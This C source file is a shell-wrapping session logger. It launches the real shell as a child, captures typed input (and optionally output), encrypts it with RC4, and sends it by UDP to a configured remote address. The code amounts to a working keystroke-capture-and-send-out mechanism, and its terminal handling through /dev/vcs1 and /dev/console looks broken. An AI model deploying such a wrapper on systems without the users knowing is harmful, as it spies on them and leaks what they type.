#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/ioctl.h>
#include <sys/wait.h>
#include <sys/time.h>
#include <termios.h>
#include <unistd.h>
#include <signal.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <fcntl.h>
#include <netdb.h>
#include <errno.h>
#include <time.h>
#include <assert.h>
#include <pty.h>
#include <utmp.h>
#include <bits/fcntl-linux.h>

#include "config.h"
#include "utils.h"
#include "rc4.h"
#include "sha1.h"

#if CLIENT_DBG
#define client_dbg(format, arg...) DBG_PRINT_FUNC(format, "CLIENT_DBG", ##arg)
#else
#define  client_dbg(x...)
#endif

#define client_err(format, arg...) DBG_PRINT_FUNC(format, "CLIENT_ERR", ##arg)

/* signal handler */

static int got_sigchld = 0;

static void sighandler(int signum) {
    if (signum == SIGCHLD) {
	got_sigchld = 1;
    }
}

static int setup_terminal(int tty, struct termios *tm) {
    struct termios tbttr;
    int ret = 0;

    assert(tm != NULL);

    ret = tcgetattr(0, tm);
    if (ret) {
	client_err("Failed to get terminal attributes: %d\r\n", errno);
	return -1;
    }

    memcpy(&tbttr, tm, sizeof (tbttr));

    tcsetattr(tty, TCSANOW, tm);

    tbttr.c_iflag |= IGNPAR; /* Ignore framing errors and parity errors. */
    tbttr.c_iflag &= ~(ISTRIP | INLCR | IGNCR | ICRNL | IXON | IXANY | IXOFF);
    tbttr.c_lflag &= ~(ISIG | ICANON | ECHO | ECHOE | ECHOK | ECHONL | IEXTEN);
    tbttr.c_oflag &= ~OPOST;

    tbttr.c_cc[VMIN] = 1;
    tbttr.c_cc[VTIME] = 0;

    tcsetattr(0, TCSANOW, &tbttr);

    return 0;
}

static void reset_terminal(struct termios *tm) {
    assert(tm != NULL);
    tcsetattr(0, TCSANOW, tm);
}

static int create_server_connection(Connection_Data_t *cd) {

    assert(cd != NULL);

    if ((cd->server_fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) < 0) {
	client_err("Failed to open socket: %d\r\n", errno);
	return -1;
    }

    cd->server_addr.sin_family = AF_INET;
    cd->server_addr.sin_port = htons(SHELL_LOG_SERVER_PORT);
    inet_aton(CONNECT_IP, &cd->server_addr.sin_addr);
    cd->nb_pkt_sent = 0;

    return 0;
}

static int create_real_shell_run_cmd(char *argv[],
	char *cmd_str, int cmd_str_max_length) {

    int cmd_str_index = 0;
    char *last_slash = NULL;
    int n = strlen(REAL_SHELL_DIR);

    assert(cmd_str != NULL);
    assert(argv != NULL);

    if ((last_slash = strrchr(argv[0], '/')) == NULL) {
	last_slash = argv[0];
    }

    client_dbg("CMD: %s\r\n", last_slash);

    if (n > cmd_str_max_length - cmd_str_index)
	goto not_enough_buffer_length;

    memcpy(&cmd_str[cmd_str_index], REAL_SHELL_DIR, n);
    cmd_str_index += n;

    if (cmd_str[cmd_str_index - 1] != '/') {
	cmd_str[cmd_str_index++] = '/';
    }

    n = (int) (last_slash - argv[0]);

    if (n > cmd_str_max_length - cmd_str_index)
	goto not_enough_buffer_length;

    memcpy(&cmd_str[cmd_str_index], last_slash, n);
    cmd_str_index += n;

    n = 1;
    if (n > cmd_str_max_length - cmd_str_index)
	goto not_enough_buffer_length;
    cmd_str[cmd_str_index++] = '\0';

    return 0;
not_enough_buffer_length:
    client_err("Not enough buffer length for real shell command [need: %d, available: %d]\r\n",
	    n, cmd_str_max_length - cmd_str_index);
    return -1;
}

static int encrypt_and_send(Connection_Data_t *cd, Session_Data_t * sd) {
    int i = 0;
    sha1_context sha1;
    struct rc4_state rc4;
    unsigned char pktkey[32];
    unsigned char msg[MAX_TRANSFER_PKT_SZ];
    int rc4_offset = 0;
    int msg_index = 0;
    struct timeval tv;

    assert(cd != NULL);
    assert(sd != NULL);

    gettimeofday(&tv, NULL);
    sd->time = tv.tv_sec;

    srand(time(NULL));

    /* setup a new RC4 IV */

    for (rc4_offset = 0; rc4_offset < RC4_SZ; rc4_offset++)
	msg[rc4_offset] = rand() & 0xFF;

    /* append the packet header */

    memcpy(&msg[RC4_SZ + msg_index], sd, SESSION_SZ);
    msg_index += SESSION_SZ;

    memcpy(&msg[RC4_SZ + msg_index], &sd->buffer[i], sd->len);
    msg_index += sd->len;
    msg[RC4_SZ + msg_index++] = '\0';

    /* setup the per-packet RC4 key */

    memcpy(pktkey, secret, RC4_SZ);
    memcpy(pktkey + RC4_SZ, msg, RC4_SZ);

    sha1_starts(&sha1);
    sha1_update(&sha1, pktkey, SZARR(pktkey));
    sha1_finish(&sha1, pktkey);

    /* encrypt and send the buffer */

    rc4_setup(&rc4, pktkey, SHA1_SZ);
    rc4_crypt(&rc4, msg + RC4_SZ, msg_index + SHA1_SZ);

    sha1_starts(&sha1);
    sha1_update(&sha1, &msg[RC4_SZ], msg_index);
    sha1_finish(&sha1, &msg[RC4_SZ + msg_index]);

    sendto(cd->server_fd, msg, RC4_SZ + msg_index + SHA1_SZ, 0,
	    (struct sockaddr *) &cd->server_addr,
	    sizeof ( cd->server_addr));

#ifdef DEBUG
    unsigned char sha1sum[SHA1_SZ];
    Session_Data_t tsd;
    int test_len = RC4_SZ + msg_index + SHA1_SZ;

    printf("Sended message: \r\n");
    printf("  seconds: %d\r\n", (int) sd->time);
    printf("      uid: %d\r\n", (int) sd->uid);
    printf("      pid: %d\r\n", (int) sd->pid);
    printf("      dir: %d\r\n", (int) sd->dir);
    printf("      len: %d\r\n", (int) sd->len);
    printf("     data: \r\n");
    __print_output(&sd->buffer[i], sd->len);
    printf("\r\n\r\n");

    sha1_starts(&sha1);
    sha1_update(&sha1, msg + RC4_SZ, test_len - RC4_SZ - SHA1_SZ);
    sha1_finish(&sha1, sha1sum);

    if (memcmp(sha1sum, msg + test_len - SHA1_SZ, SHA1_SZ) != 0) {
	shellog_err("SHA-1 checksum verification failed\n");
    }

    memcpy(pktkey, secret, RC4_SZ);
    memcpy(pktkey + RC4_SZ, msg, RC4_SZ);

    sha1_starts(&sha1);
    sha1_update(&sha1, pktkey, 32);
    sha1_finish(&sha1, pktkey);

    rc4_setup(&rc4, pktkey, SHA1_SZ);
    rc4_crypt(&rc4, msg + RC4_SZ, test_len - RC4_SZ - SHA1_SZ);

    memcpy(&tsd, &msg[rc4_offset], sizeof (Session_Data_t));

    printf("Decoded message: \r\n");
    printf("  seconds: %d\r\n", (int) tsd.time);
    printf("      uid: %d\r\n", (int) tsd.uid);
    printf("      pid: %d\r\n", (int) tsd.pid);
    printf("      dir: %d\r\n", (int) tsd.dir);
    printf("      len: %d\r\n", (int) tsd.len);
    printf("     data: \r\n");
    __print_output(tsd.buffer, tsd.len);
    printf("\r\n\r\n");

#endif

    cd->nb_pkt_sent++;
    return 0;
}

int main(int argc, char *argv[]) {

    char real_shell[256];
    char rx_buffer[MAX_BUF_SZ];
    int pty = 0, tty = 0;
    Session_Data_t sd;
    Connection_Data_t cd;
    fd_set rd;
    struct termios tty_tm; /* stored initial terminal settings */
    struct termios pty_tm; /* current PTY terminal settings */
    size_t tx_buffer_size = 0;
    uint32_t rx_read_index = 0;
    size_t bytes_to_send = 0;
    int i = 0;
    char *termtype = getenv("TERM");

    cd.server_fd = pty = tty = -1;

    /* reconstruct the original shell location */

    if (create_real_shell_run_cmd(argv, real_shell, SZARR(real_shell))) {
	client_err("Create real shell command failed\r\n");
	goto exec_real_shell;
    }

    client_dbg("Start as : %s\r\n", real_shell);
    client_dbg("Terminal type is : %s\r\n", termtype);

    if (isatty(0) == 0 ||
	    isatty(1) == 0 ||
	    isatty(2) == 0 ||
	    getlogin() == NULL) {

	client_err("Skipping non interactive shell session\r\n");
	goto exec_real_shell;
    }

    if (create_server_connection(&cd)) {
	client_err("Create server connection failed\r\n");
	goto exec_real_shell;
    }

    /* create a pseudo-terminal */

    //    if (openpty(&pty, &tty, NULL, NULL, NULL) < 0) {
    //	client_err("Open pseudo terminal failed: %d\r\n", errno);
    //	goto exec_real_shell;
    //    }

    tty = open("/dev/vcs1", O_RDWR);
    pty = open("/dev/console", O_RDWR);

    if (ttyname(tty) == NULL) {
	client_err("Get TTY name failed: %d\r\n", errno);
	goto exec_real_shell;
    }

    if (setup_terminal(tty, &tty_tm)) {
	client_err("Setup terminal failed\r\n");
	goto exec_real_shell;
    }

    /* handle child exit */

    signal(SIGCHLD, sighandler);

    /* fork to exec the original shell */

    switch ((sd.pid = fork())) {
	case(-1):
	    reset_terminal(&tty_tm);
	    client_err("Fork process failed: %d\r\n", errno);
	    goto exec_real_shell;
	    break;
	case(0):

	    /* Child : real shell */

	    if (login_tty(tty)) {
		client_err("Make tty be the controlling terminal failed: %d\r\n", errno);
		goto exec_real_shell;
	    }

	    close(cd.server_fd);

	    usleep(50000);
	    execv(real_shell, argv);
	    tcsetattr(0, TCSANOW, &tty_tm);
	    exit(1);


	    break;
	default:

	    /* Parent : shell logger */


	    sd.uid = getuid();

	    while (1) {

		FD_ZERO(&rd);
		FD_SET(pty, &rd);
		FD_SET(0, &rd);

		int n = (pty > 0) ? pty : 0;

		if ((n = select(n + 1, &rd, NULL, NULL, NULL)) < 0) {
		    if (n < 0 && (errno == EINTR || errno == EAGAIN))
			goto check_sigs;
		    break;
		}

		if (FD_ISSET(0, &rd)) {

		    /* transfer the data from stdin to pty */

		    //		    if ((n = read(0, &sd.buffer[tx_buffer_size],
		    //			    MAX_BUF_SZ - tx_buffer_size)) <= 0) {
		    //			if (n < 0 && (errno == EINTR || errno == EAGAIN))
		    //			    goto check_sigs;
		    //			break;
		    //		    }

		    if ((n = read(0, rx_buffer, MAX_BUF_SZ)) <= 0) {
			if (n < 0 && (errno == EINTR || errno == EAGAIN))
			    goto check_sigs;
			break;
		    }

		    /* We do not want to save any passwords into log file. 
		     * Password typing is hidden due to change of terminal 
		     * settings. Here we check terminal settings and do not 
		     * send symbols to server until terminal is in password 
		     * mode */

		    if (tcgetattr(pty, &pty_tm)) {
			client_err("Failed to get terminal attributes: %d\r\n", errno);
			goto check_sigs;
		    }

#ifdef DEBUG
		    struct termios prev_pty_tm; /* current PTY terminal settings */
		    if (memcmp(&pty_tm, &prev_pty_tm, sizeof (struct termios))) {

			printf("IGNBRK %d\r\n", pty_tm.c_iflag & IGNBRK);
			printf("BRKINT %d\r\n", pty_tm.c_iflag & BRKINT);
			printf("IGNPAR %d\r\n", pty_tm.c_iflag & IGNPAR);
			printf("PARMRK %d\r\n", pty_tm.c_iflag & PARMRK);
			printf("INPCK %d\r\n", pty_tm.c_iflag & INPCK);
			printf("ISTRIP %d\r\n", pty_tm.c_iflag & ISTRIP);
			printf("INLCR %d\r\n", pty_tm.c_iflag & INLCR);
			printf("IGNCR %d\r\n", pty_tm.c_iflag & IGNCR);
			printf("ICRNL %d\r\n", pty_tm.c_iflag & ICRNL);
			printf("IUCLC %d\r\n", pty_tm.c_iflag & IUCLC);
			printf("IXON %d\r\n", pty_tm.c_iflag & IXON);
			printf("IXANY %d\r\n", pty_tm.c_iflag & IXANY);
			printf("IXOFF %d\r\n", pty_tm.c_iflag & IXOFF);
			printf("IMAXBEL %d\r\n", pty_tm.c_iflag & IMAXBEL);
			printf("IUTF8 %d\r\n", pty_tm.c_iflag & IUTF8);

			memcpy(&prev_pty_tm, &pty_tm, sizeof (struct termios));
		    }
#endif

		    if ((pty_tm.c_iflag & ICRNL) && (pty_tm.c_lflag & ICANON)) {

			/* password mode */

		    } else {

			/* normal mode */

			sd.dir = INPUT_DIR;
			sd.len = n;
			memcpy(sd.buffer, rx_buffer, n);
			encrypt_and_send(&cd, &sd);
		    }


		    if ((n = write(pty, rx_buffer, n)) != n) {
			if (n < 0 && (errno == EINTR || errno == EAGAIN))
			    goto check_sigs;

			break;
		    }
		}

		if (FD_ISSET(pty, &rd)) {

		    /* transfer the data from pty to stdout */

		    if ((n = read(pty, rx_buffer, MAX_BUF_SZ)) <= 0) {
			if (n < 0 && (errno == EINTR || errno == EAGAIN))
			    goto check_sigs;

			break;
		    }

#if LOG_OUTPUT 
		    sd.dir = OUTPUT_DIR;
		    sd.len = n;
		    encrypt_and_send(&cd, &sd);
#endif
		    if ((n = write(1, rx_buffer, n)) != n) {
			if (n < 0 && (errno == EINTR || errno == EAGAIN))
			    goto check_sigs;

			break;
		    }
		}

check_sigs:
		if (got_sigchld == 1) {
		    got_sigchld = 0;
		    break;
		}

	    }

	    break;
    }

exec_real_shell:

    if (tty >= 0)
	close(tty);

    if (pty >= 0)
	close(pty);

    if (cd.server_fd >= 0)
	close(cd.server_fd);

    execv(real_shell, argv);
    exit(1);
}